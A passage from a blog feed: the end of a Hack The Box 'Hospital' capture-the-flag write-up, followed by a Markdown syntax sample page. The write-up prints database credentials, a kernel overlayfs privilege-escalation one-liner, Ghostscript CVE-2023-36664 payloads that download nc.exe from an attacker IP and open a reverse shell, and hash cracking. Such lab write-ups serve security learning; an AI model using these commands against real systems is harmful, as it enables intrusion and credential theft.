+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">www&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">webserver&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">cat&lt;/span> &lt;span class="n">config&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/*&lt;/span> &lt;span class="n">Database&lt;/span> &lt;span class="n">credentials&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">Assuming&lt;/span> &lt;span class="n">you&lt;/span> &lt;span class="n">are&lt;/span> &lt;span class="n">running&lt;/span> &lt;span class="n">MySQL&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">server&lt;/span> &lt;span class="n">with&lt;/span> &lt;span class="n">default&lt;/span> &lt;span class="n">setting&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">user&lt;/span> &lt;span class="s1">&amp;#39;root&amp;#39;&lt;/span> &lt;span class="n">with&lt;/span> &lt;span class="n">no&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_SERVER&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;localhost&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_USERNAME&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;root&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_PASSWORD&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;my$qls3rv1c3!&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">define&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;DB_NAME&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;hospital&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">/*&lt;/span> &lt;span class="n">Attempt&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">connect&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">MySQL&lt;/span> &lt;span class="n">database&lt;/span> &lt;span class="o">*/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">$&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mysqli_connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">DB_SERVER&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">DB_USERNAME&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">DB_PASSWORD&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">DB_NAME&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">//&lt;/span> &lt;span class="n">Check&lt;/span> &lt;span class="n">connection&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">$&lt;/span>&lt;span class="n">link&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="bp">false&lt;/span>&lt;span class="p">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">die&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;ERROR: Could not connect. &amp;#34;&lt;/span> &lt;span class="o">.&lt;/span> &lt;span class="n">mysqli_connect_error&lt;/span>&lt;span class="p">());&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="first-privilege-escalation">First Privilege Escalation&lt;/h2>
+&lt;p>After several unsuccessful attempts, I revisit my notes and initiate a privilege escalation at the source. This involves inspecting the SUID binaries, followed by a naïve execution of sudo -l, and subsequently checking the kernel version. This effort eventually leads to the identification of our next exit route: &lt;code>CVE-2023-032629.&lt;/code>&lt;/p>
+&lt;p>We execute this payload to get root privilege because kernel version was old &lt;code>(5.19.0)&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">unshare -rm sh -c &lt;span class="s2">&amp;#34;mkdir l u w m &amp;amp;&amp;amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;amp;&amp;amp; touch m/*;&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> u/python3 -c &lt;span class="s1">&amp;#39;import os;os.setuid(0);os.system(&amp;#34;cp /bin/bash /var/tmp/bash &amp;amp;&amp;amp; chmod 4755 /var/tmp/bash &amp;amp;&amp;amp; /var/tmp/bash -p &amp;amp;&amp;amp; rm -rf l m u w /var/tmp/bash&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Subsequently, while exploring the files as root (and not NT\Authority), three interesting usernames are encountered: google, josharian, mdlayher, vishvananda from /home/drwilliams/go/pkg/mod/github.com. &lt;br>
+Unfortunately, nothing of significance is discovered, save for a Go project.&lt;/p>
+&lt;p>Capitalizing on my newfound root status, I seize the opportunity to retrieve Dr. Williams&amp;rsquo; hash and proceed to crack it using our trusty ally John.&lt;/p>
+&lt;p>&lt;code>$6$uWBSe***blablablasomerandomstuffs***W192y/:19612:0:99999:7:::&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-12.png"
+width="1474"
+height="754"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-12_hua05d3abc3ef8a01d36132a43c4da66dc_210164_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-12_hua05d3abc3ef8a01d36132a43c4da66dc_210164_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="195"
+data-flex-basis="469px"
+>&lt;/p>
+&lt;p>and our best friend John gave us the password !&lt;/p>
+&lt;h2 id="2supndsup-foothold">2&lt;sup>nd&lt;/sup> FootHold&lt;/h2>
+&lt;p>With the password successfully obtained, we can finally return to the website on port 443. Upon logging in, we stumble upon an intriguing email tasking us with designing something in .eps format for viewing by GhostScript.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-13.png"
+width="1905"
+height="837"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-13_hu3571bdd648b3fb24eb93fd789aa0565b_93756_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/image-13_hu3571bdd648b3fb24eb93fd789aa0565b_93756_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="227"
+data-flex-basis="546px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Dear Lucy,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">I wanted to remind you that the project for lighter, cheaper and
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">environmentally friendly needles is still ongoing 💉. You are the one in
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">charge of providing me with the designs for these so that I can take
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">them to the 3D printing department and start producing them right away.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Please make the design in an &amp;#34;.eps&amp;#34; file format so that it can be well
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">visualized with GhostScript.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Best regards,
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Chris Brown.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;em>Notice that .eps &amp;ndash;&amp;gt; adobe format stand for encapsulated postscript&lt;/em>&lt;/p>
+&lt;p>After reading the email, it is clear that we need to send him a .eps file. Fortunately, the first GitHub link we found provides a Proof of Concept (PoC) on an exploit that allows us to achieve Remote Code Execution (RCE) that&amp;rsquo;s the &lt;strong>CVE-2023–36664&lt;/strong>. &lt;br>
+To accomplish this, we ensure that the target machine has Netcat installed, so we send it first, and then proceed to use the sent file (Netcat) to execute commands.&lt;/p>
+&lt;p>Some ref : &lt;br>
+&lt;a class="link" href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git" target="_blank" rel="noopener"
+>https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git&lt;/a>&lt;/p>
+&lt;p>&lt;a class="link" href="https://www.youtube.com/watch?v=Gh-A49rqrJI&amp;amp;ab_channel=%C3%81kosJakab" target="_blank" rel="noopener"
+>https://www.youtube.com/watch?v=Gh-A49rqrJI&amp;ab_channel=%C3%81kosJakab&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 CVE_2023_36664_exploit.py --inject --payload &lt;span class="s2">&amp;#34;curl http://10.10.14.7/nc.exe -o nc.exe&amp;#34;&lt;/span> --filename file.eps
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and,&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 CVE_2023_36664_exploit.py --inject --payload &lt;span class="s2">&amp;#34;nc.exe 10.10.14.7 1234 -e cmd&amp;#34;&lt;/span> --filename rv.eps
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Once this is done, we reply to this email, clicking on the paperclip icon (attachment), selecting the file, and then sending it in return.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-4.png"
+width="800"
+height="228"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-4_hu4af202d0cb5bf57c78fb8d4a60b9abba_25387_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-4_hu4af202d0cb5bf57c78fb8d4a60b9abba_25387_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Send our netcat.exe"
+class="gallery-image"
+data-flex-grow="350"
+data-flex-basis="842px"
+>&lt;/p>
+&lt;p>We patiently wait for her to open the email,&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-2.png"
+width="1885"
+height="766"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-2_huba2e9a8d03b4d542c8e3a486a3922f1e_144902_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-2_huba2e9a8d03b4d542c8e3a486a3922f1e_144902_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Process to reply and send our payloads"
+class="gallery-image"
+data-flex-grow="246"
+data-flex-basis="590px"
+>&lt;/p>
+&lt;p>and we obtain a reverse shell.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-5.png"
+width="933"
+height="310"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-5_hu87df8fbb037675dc502b3fe2f6af19eb_65969_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-5_hu87df8fbb037675dc502b3fe2f6af19eb_65969_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Got revershell as DrBrown"
+class="gallery-image"
+data-flex-grow="300"
+data-flex-basis="722px"
+>&lt;/p>
+&lt;h2 id="2supndsup-privilege-esclation">2&lt;sup>nd&lt;/sup> Privilege Esclation&lt;/h2>
+&lt;p>Upon connection, we notice a batch file containing Dr. Brown&amp;rsquo;s credentials. Although not yet attempted, I assume we can connect using Evil-WinRM and obtain a more stable shell.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-7.png"
+width="1897"
+height="171"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-7_hu69f05eb2eb65f22a87725199e910a938_66797_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-7_hu69f05eb2eb65f22a87725199e910a938_66797_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Retrieve DrBrown&amp;rsquo;s password from bat&amp;rsquo;s script"
+class="gallery-image"
+data-flex-grow="1109"
+data-flex-basis="2662px"
+>&lt;/p>
+&lt;p>back to nmap ;&lt;br>
+We utilize these credentials to enumerate what we can. With nothing significant found in SMB, we pivot towards rpcclient. &lt;br>
+After several commands yield no fruitful results&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rpcclient 10.10.11.241 -U &lt;span class="s2">&amp;#34;drbrown&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>&lt;code>tshareenum&lt;/code> &amp;ndash;&amp;gt; acces denied \&lt;/li>
+&lt;li>&lt;code>enum&lt;/code> &amp;ndash;&amp;gt; command not found&lt;/li>
+&lt;li>&lt;code>enumdomains&lt;/code> &amp;ndash;&amp;gt; none intersting&lt;/li>
+&lt;li>&lt;code>enumdomgroups&lt;/code> &amp;ndash;&amp;gt; retrieve rid of admin&lt;/li>
+&lt;li>&lt;code>querygroup&lt;/code> &lt;RID ADMIN> &amp;ndash;&amp;gt; some information&lt;/li>
+&lt;/ul>
+&lt;p>Next, I discovered the necessary command from this remarkable website.
+&lt;a class="link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------" target="_blank" rel="noopener"
+>https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration?source=post_page-----791ad6dd24ed--------------------------------&lt;/a>&lt;/p>
+&lt;p>, we then utilize the &lt;code>querydispinfo&lt;/code> command and notice that Administrator Information is shared with the Guest..&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-9.png"
+width="1568"
+height="437"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-9_hu9c2da5f945ca3c3279dfa355137c2106_239412_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-9_hu9c2da5f945ca3c3279dfa355137c2106_239412_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="358"
+data-flex-basis="861px"
+>&lt;/p>
+&lt;p>Knowing that this machine hosts a web application, we exploit the C drive and gain access to the directory of the web application. &lt;br>
+Upon using &lt;code>icacls&lt;/code>, it reveals the permissions of the accounts on this folder.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-11.png"
+width="619"
+height="385"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-11_hud77c0b1bdec1ca3049fbbc0ed8153c42_73459_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-11_hud77c0b1bdec1ca3049fbbc0ed8153c42_73459_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="385px"
+>&lt;/p>
+&lt;p>We know that this machine is running a web application so we exploit C drive and we have the directory of web application. Upon using icacls, it tells us the permission of the accounts on this folder.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-13.png"
+width="619"
+height="593"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-13_hu8fa3ae32af05bc9d3b00ec3cf6a208bf_135284_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-13_hu8fa3ae32af05bc9d3b00ec3cf6a208bf_135284_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="104"
+data-flex-basis="250px"
+>&lt;/p>
+&lt;p>To locate my reverse shell I used this forum : &lt;a class="link" href="https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp" target="_blank" rel="noopener"
+>https://stackoverflow.com/questions/16772198/how-do-i-test-a-website-using-xampp&lt;/a>&lt;/p>
+&lt;p>We set up a reverse shell, hoping to obtain a connection with elevated privileges, given that we have access.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/image-14.png"
+width="1362"
+height="607"
+srcset="https://shaanksm.github.io/p/hospital-writeup/image-14_huf0ac3c6ac73a8f60b8e1d89c6bd4b289_53193_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/image-14_huf0ac3c6ac73a8f60b8e1d89c6bd4b289_53193_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="224"
+data-flex-basis="538px"
+>&lt;/p>
+&lt;p>Box forums provide some guidance, certain hints or questions can be too revealing. Therefore, I&amp;rsquo;d like to express my gratitude to this particular source that crafted a writeup containing only hints. It proved incredibly helpful during my privilege escalation phase.&lt;/p>
+&lt;p>Thank a lot : &lt;a class="link" href="https://svadhyayan.com/htb-hospital-writeup/" target="_blank" rel="noopener"
+>https://svadhyayan.com/htb-hospital-writeup/&lt;/a>&lt;/p></description></item><item><title>Markdown Syntax Guide</title><link>https://shaanksm.github.io/p/markdown-syntax-guide/</link><pubDate>Thu, 07 Sep 2023 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/markdown-syntax-guide/</guid><description>&lt;p>This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.&lt;/p>
+&lt;h2 id="headings">Headings&lt;/h2>
+&lt;p>The following HTML &lt;code>&amp;lt;h1&amp;gt;&lt;/code>—&lt;code>&amp;lt;h6&amp;gt;&lt;/code> elements represent six levels of section headings. &lt;code>&amp;lt;h1&amp;gt;&lt;/code> is the highest section level while &lt;code>&amp;lt;h6&amp;gt;&lt;/code> is the lowest.&lt;/p>
+&lt;h1 id="h1">H1&lt;/h1>
+&lt;h2 id="h2">H2&lt;/h2>
+&lt;h3 id="h3">H3&lt;/h3>
+&lt;h4 id="h4">H4&lt;/h4>
+&lt;h5 id="h5">H5&lt;/h5>
+&lt;h6 id="h6">H6&lt;/h6>
+&lt;h2 id="paragraph">Paragraph&lt;/h2>
+&lt;p>Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.&lt;/p>
+&lt;p>Itatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.&lt;/p>
+&lt;h2 id="blockquotes">Blockquotes&lt;/h2>
+&lt;p>The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a &lt;code>footer&lt;/code> or &lt;code>cite&lt;/code> element, and optionally with in-line changes such as annotations and abbreviations.&lt;/p>
+&lt;h3 id="blockquote-without-attribution">Blockquote without attribution&lt;/h3>
+&lt;blockquote>
+&lt;p>Tiam, ad mint andaepu dandae nostion secatur sequo quae.
+&lt;strong>Note&lt;/strong> that you can use &lt;em>Markdown syntax&lt;/em> within a blockquote.&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="blockquote-with-attribution">Blockquote with attribution&lt;/h3>
+&lt;blockquote>
+&lt;p>Don&amp;rsquo;t communicate by sharing memory, share memory by communicating.&lt;br>
+— &lt;cite>Rob Pike&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;/cite>&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="tables">Tables&lt;/h2>
+&lt;p>Tables aren&amp;rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.&lt;/p>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Name&lt;/th>
+&lt;th>Age&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Bob&lt;/td>
+&lt;td>27&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Alice&lt;/td>
+&lt;td>23&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="inline-markdown-within-tables">Inline Markdown within tables&lt;/h3>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>Italics&lt;/th>
+&lt;th>Bold&lt;/th>
+&lt;th>Code&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>&lt;em>italics&lt;/em>&lt;/td>
+&lt;td>&lt;strong>bold&lt;/strong>&lt;/td>
+&lt;td>&lt;code>code&lt;/code>&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>A&lt;/th>
+&lt;th>B&lt;/th>
+&lt;th>C&lt;/th>
+&lt;th>D&lt;/th>
+&lt;th>E&lt;/th>
+&lt;th>F&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Lorem ipsum dolor sit amet, consectetur adipiscing elit.&lt;/td>
+&lt;td>Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex.&lt;/td>
+&lt;td>Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus&lt;/td>
+&lt;td>Proin sit amet velit nec enim imperdiet vehicula.&lt;/td>
+&lt;td>Ut bibendum vestibulum quam, eu egestas turpis gravida nec&lt;/td>
+&lt;td>Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="code-blocks">Code Blocks&lt;/h2>
+&lt;h3 id="code-block-with-backticks">Code block with backticks&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&amp;lt;!doctype html&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">html&lt;/span> &lt;span class="na">lang&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;en&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">meta&lt;/span> &lt;span class="na">charset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Example HTML5 Document&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">title&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">head&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>Test&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
